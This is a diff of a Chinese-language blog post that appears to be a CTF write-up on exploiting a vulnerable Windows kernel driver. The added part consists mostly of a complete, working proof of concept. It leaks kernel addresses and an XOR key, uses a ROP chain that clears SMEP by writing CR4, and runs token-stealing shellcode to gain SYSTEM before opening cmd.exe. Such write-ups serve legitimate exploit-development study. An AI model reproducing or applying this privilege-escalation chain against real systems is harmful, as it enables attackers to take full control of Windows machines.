@@ -742,7 +742,7 @@ nt authority/system
     final:
     mov [rcx + 0x70], rax       ;modify the token to system's
     ```
-    
+    ```<our process id>```關係到目前程序的PID，我們只需要先將他設為 0 之後再改就好了。
     接下來，幫我們遇到可以掌握 Kernel Driver 的 Execution Flow 的場景，就可以用這支小程式提權了!
 
 ## IV 核心保護機制和繞過
@@ -1278,8 +1278,13 @@ DWORD pid = GetCurrentProcessId();
 shellcode[54] = (char)pid;
 shellcode[55] = (char)(pid >> 8);
 ```
-接下來用 VirtualAlloc 來分配一塊擁有 RWE 權限的記憶體，最後把 VirtuAlloc 回傳的位址放到 ROP Chain 裡。(原題解中只有 RW，然後手動用 ASM 秀一波 PML4E 定址然後手動改 XD 位元，我其實不太懂為甚麼要這樣 <span style="font-size: 30px;">🤨</span>)
-
+接下來用 VirtualAlloc 來分配一塊擁有 RWE 權限的記憶體，最後把 VirtuAlloc 回傳的位址放到 ROP Chain 裡，然後 IOCTL 完後再啟動一個 CMD 就大功告成啦! (原題解中只有 ```VirtualAlloc``` RW，然後手動用 ASM 秀一波 PML4E 定址然後手動改 XD 位元，我其實不太懂為甚麼要這樣 <span style="font-size: 30px;">🤨</span>)
+```c++
+void start_process(){
+    puts("Exploit done, waiting for command prompt...\n");
+    system("cmd.exe");
+}
+```
 ```c++
 PVOID shellcode_addr = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 memcpy(shellcode_addr, shellcode, sizeof(shellcode));
@@ -1288,6 +1293,135 @@ printf("Shellcode at 0x%llx\n", (uintptr_t)shellcode);
 payload[40] = ADDR((uintptr_t)shellcode_addr);
 
 DeviceIoControl(device, IOCTL_ENCRYPT, &payload, sizeof(payload), NULL, sizeof(payload), &outSize, NULL); //Send our payload!
+
 ```
 
+做完POC後，我<span style="text-decoration: line-through; text-decoration-thickness: 3px;">~~性~~致勃勃的</span>執行，結果...
+<figure>
+    <video width="640" height="360" controls>
+      <source src="https://lompandi.github.io/posts/post3/vids/failed.mp4" type="video/mp4">
+      Your browser does not support the video tag.
+    </video>
+    <figcaption>看好了觀眾們! 我只會示範一次...</figcaption>
+</figure>
 
+為甚麼啊😭? 後來我發現我沒恢復堆疊框架導至它執行完 shellcode 後就不知道要幹嘛了，而恢復 stack frame 又很麻煩(我很懶) 正當我一籌莫展時，我看到了古人留下來的題解...
+
+* ### 既來之，則安之
+    《論語． 季氏》的解題方式這樣寫: 「遠人不服，則脩文德以來之。既來之，則安之。」，
+
+    他說，既然 RIP 都大老遠從核心模式分區跑來使用者模式分區執行你的 shellcode 了，那你何不讓安<span style="text-decoration: line-through; text-decoration-thickness: 3px;">~~葬~~</span>頓在這裡呢?
+    
+    於是，我在原有的 shellcode 加了下列程式碼:
+    ```
+    loop:
+    jmp loop
+    ```
+    組譯後變成 ```\xEB\xFE```，將其加入到我們的 shellcode 末端，```\xC3```(ret) 前，然後把 shellcode 稍作修改:
+    ```c++
+    char shellcode[] = "\x65\x48\x8B\x14\x25\x88\x01\x00\x00\x48\x8B\x92\xB8\x00\x00\x00\x4c\x8B\x8a\x48\x04\x00\x00\x49\x8B\x09\x48\x8B\x51\xF8\x48\x83\xFA\x04\x74\x05\x48\x8B\x09\xEB\xF1\x48\x8B\x41\x70\x24\xF0\x48\x8B\x51\xF8\x48\x81\xFA\x00\x00\x00\x00\x74\x05\x48\x8B\x09\xEB\xEE\x48\x89\x41\x70\xEB\xFE\xC3"; // Added infinite loop
+    DWORD pid = GetCurrentProcessId();
+
+    shellcode[54] = (char)pid;
+    shellcode[55] = (char)(pid >> 8);
+
+    PVOID shellcode_addr = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    memcpy(shellcode_addr, shellcode, sizeof(shellcode));
+    printf("Shellcode 0x%llx\n", (uintptr_t)shellcode);
+    payload[40] = ADDR((uintptr_t)shellcode_addr);
+    
+    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)start_process, NULL, NULL, NULL);
+    DeviceIoControl(device, IOCTL_ENCRYPT, &payload, sizeof(payload), NULL, sizeof(payload), &outSize, NULL);
+    ```
+    ```c++
+    void start_process(){
+        puts("Exploit done, waiting for command prompt...\n");
+        Sleep(5); //wait a bit before launching command prompt
+        system("cmd.exe");
+    }
+    ```
+    
+    最後結果:
+    <figure>
+        <video width="640" height="360" controls>
+          <source src="https://lompandi.github.io/posts/post3/vids/success.mp4" type="video/mp4">
+          Your browser does not support the video tag.
+        </video>
+        <figcaption沒有討喜的藍色畫面了，真難過... </figcaption>
+    </figure>
+    
+    最後是完整的POC:
+    ```c++
+    #include <windows.h>
+    #include <cstdio>
+
+    #define IOCTL_ENCRYPT 0x9C40240B
+    #define ADDR(x) ((x) ^ xor_key)
+    
+    void hexdump(const void *data, size_t size) {
+        unsigned char *ptr = (unsigned char *)data;
+        size_t i, j;
+    
+        for (i = 0; i < size; i += 16) {
+            printf("%08zx  ", i);
+            for (j = 0; j < 16 && i + j < size; ++j)
+                printf("%02x ", ptr[i + j]);
+            for (j = 0; j < 16 && i + j < size; ++j)
+                printf("   ");
+            printf("\n");
+        }
+    }
+    
+    void start_process(){
+        puts("Exploit done, waiting for command prompt...\n");
+        Sleep(5);
+        system("cmd.exe");
+    }
+    
+    int main(){
+        HANDLE device = CreateFileW(L"\\\\.\\BreathofShadow", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_SYSTEM, NULL);
+    
+        if(device == INVALID_HANDLE_VALUE){
+            puts("Failed to open driver\n");
+            return 1;
+        }
+        puts("[*] Successfully opened the driver\n");
+        DWORD outSize{};
+    
+        char stack_dump[560] = {0x41};
+        DeviceIoControl(device, IOCTL_ENCRYPT, stack_dump, 1, NULL, 560, &outSize, NULL);
+        hexdump(stack_dump + 256, 48);
+    
+        uintptr_t xor_key = 0x4141414141414141;
+        DeviceIoControl(device, IOCTL_ENCRYPT, &xor_key, 8, NULL, 8, &outSize, NULL);
+        xor_key ^= 0x4141414141414141;
+        printf("Encryption key: 0x%llx\n", xor_key);
+    
+        uintptr_t* stack_ptrs = (uintptr_t*)stack_dump;
+        uintptr_t kernel_base = stack_ptrs[33] - 0xA1A301;
+           printf("Nt module base at 0x%llx\n", kernel_base);
+
+        uintptr_t payload[74] {};
+        for(int i = 36; i >= 31; i--){
+            payload[i] = ADDR(stack_ptrs[i]);
+        }
+    
+        payload[37] = ADDR(kernel_base + 0x2148C8); //pop rcx; ret
+        payload[38] = ADDR(0x50ef0);                //cr4 value
+        payload[39] = ADDR(kernel_base + 0x3A0A87); //mov cr4, rcx; ret
+    
+        char shellcode[] = "\x65\x48\x8B\x14\x25\x88\x01\x00\x00\x48\x8B\x92\xB8\x00\x00\x00\x4c\x8B\x8a\x48\x04\x00\x00\x49\x8B\x09\x48\x8B\x51\xF8\x48\x83\xFA\x04\x74\x05\x48\x8B\x09\xEB\xF1\x48\x8B\x41\x70\x24\xF0\x48\x8B\x51\xF8\x48\x81\xFA\x00\x00\x00\x00\x74\x05\x48\x8B\x09\xEB\xEE\x48\x89\x41\x70\xEB\xFE\xC3";
+        DWORD pid = GetCurrentProcessId();
+    
+        shellcode[54] = (char)pid;
+        shellcode[55] = (char)(pid >> 8);
+    
+        PVOID shellcode_addr = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+        memcpy(shellcode_addr, shellcode, sizeof(shellcode));
+        printf("Shellcode 0x%llx\n", (uintptr_t)shellcode);
+        payload[40] = ADDR((uintptr_t)shellcode_addr);
+    
+        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)start_process, NULL, NULL, NULL);
+        DeviceIoControl(device, IOCTL_ENCRYPT, &payload, sizeof(payload), NULL, sizeof(payload), &outSize, NULL);
+    }
+    ```
